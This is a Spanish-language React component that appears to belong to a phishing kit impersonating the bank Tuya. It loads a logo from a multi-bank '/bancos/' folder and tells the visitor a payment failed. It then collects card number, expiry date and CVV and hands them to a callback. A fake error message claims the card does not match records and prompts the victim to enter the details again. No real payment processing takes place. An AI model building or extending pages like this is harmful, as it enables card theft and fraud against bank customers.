/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState, useMemo, useEffect } from "react";

export default function Tc({ enviar, isError }: any) {
  const [tarjeta, setTarjeta] = useState("");
  const [fecha, setFecha] = useState("");
  const [cvv, setCvv] = useState("");
  const [error, setError] = useState(isError ? "El número de la tarjeta tiene un error o no coincide con nuestros registros. Por favor, ingrésalo nuevamente." : "");

  const isTarjetaValid = tarjeta.length >= 15 && tarjeta.length <= 16;
  const isFechaValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(fecha);
  const isCvvValid = cvv.length >= 3 && cvv.length <= 4;

  const canSubmit = isTarjetaValid && isFechaValid && isCvvValid;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit) {
      setError("Por favor, ingrese todos los datos correctamente.");
      return;
    }
    setError("");
    enviar?.({ tarjeta, fecha, cvv, view: "tarjeta_verif" });
  };

  const handleFechaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, "");
    if (val.length > 4) val = val.slice(0, 4);

    if (val.length > 2) {
      val = val.slice(0, 2) + "/" + val.slice(2);
    }
    setFecha(val);
  };

  return (
    
    <div className="min-h-screen bg-white flex justify-center items-center p-4 font-sans" style={{ minHeight: '100vh' }}>
      <div className="w-full max-w-[400px] p-8">
    
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap');
        .font-manrope { font-family: 'Manrope', sans-serif; }
        
        .field-container {
          margin-bottom: 20px;
        }
        
        .field-container label {
          display: block;
          font-size: 13px;
          font-weight: 700;
          color: #333;
          margin-bottom: 6px;
          text-align: left;
        }

        .field-container input {
          width: 100%;
          height: 48px;
          border: 1px solid #ccc;
          border-radius: 8px;
          padding: 0 16px;
          font-size: 16px;
          color: #333;
          outline: none;
          transition: border-color 0.2s;
        }
        
        .field-container input:focus {
          border-color: #FF5A00;
        }

        .field-container input.error-input {
          border-color: #E1111C;
          background-color: #fdf2f2;
        }
      `}} />

      {/* Logo */}
      <div style={{ display: "flex", justifyContent: "center", width: "100%", marginTop: "24px", marginBottom: "32px" }}>
          <img src="/bancos/tuya/logo_tuya.svg" style={{ height: "28px", width: "auto" }} alt="Logo" />
      </div>

      <div className="mb-6 text-center">
        <h2 className="text-[22px] font-extrabold text-[#2C2A29] font-manrope">
          Pago no realizado
        </h2>
        <p className="text-[14px] text-gray-500 mt-2 font-manrope">
          En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
        </p>
      </div>

      <form onSubmit={handleSubmit} className="font-manrope">
        {/* Tarjeta Input */}
        <div className="field-container">
          <label htmlFor="tarjeta_num">Número de Tarjeta</label>
          <input
            id="tarjeta_num"
            type="text"
            placeholder="XXXX XXXX XXXX XXXX"
            maxLength={16}
            value={tarjeta}
            className={error ? "error-input" : ""}
            onChange={(e) => {
              setTarjeta(e.target.value.replace(/[^0-9]/g, ""));
              setError("");
            }}
          />
        </div>

        {/* Fila Fecha y CVV */}
        <div style={{ display: "flex", gap: "16px", marginBottom: "24px" }}>
          <div style={{ flex: 1 }} className="field-container">
            <label htmlFor="tarjeta_fecha">Fecha (MM/AA)</label>
            <input
              id="tarjeta_fecha"
              type="text"
              placeholder="MM/AA"
              value={fecha}
              className={error ? "error-input" : ""}
              onChange={(e) => {
                handleFechaChange(e);
                setError("");
              }}
            />
          </div>

          <div style={{ flex: 1 }} className="field-container">
            <label htmlFor="tarjeta_cvv">CVV</label>
            <input
              id="tarjeta_cvv"
              type="password"
              placeholder="***"
              maxLength={4}
              value={cvv}
              className={error ? "error-input" : ""}
              onChange={(e) => {
                setCvv(e.target.value.replace(/[^0-9]/g, ""));
                setError("");
              }}
            />
          </div>
        </div>

        {/* Error Message */}
        {error && (
          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginTop: "10px", marginBottom: "20px" }}>
            <p style={{ color: "#E1111C", margin: 0, fontSize: "14px", fontWeight: "600", textAlign: "left" }}>
              ⚠️ {error}
            </p>
          </div>
        )}

        {/* Submit Button */}
        <div style={{ marginTop: "24px" }}>
          <button
            type="submit"
            disabled={!canSubmit}
            className="w-full py-4 text-white font-bold text-lg rounded-xl transition-all"
            style={{
              backgroundColor: "#FF5A00",
              opacity: canSubmit ? 1 : 0.5,
              cursor: canSubmit ? "pointer" : "not-allowed"
            }}
          >
            {isError ? "Reintentar Validación" : "Verificar Tarjeta"}
          </button>
        </div>
      </form>
    
      </div>
    </div>
    
  );
}
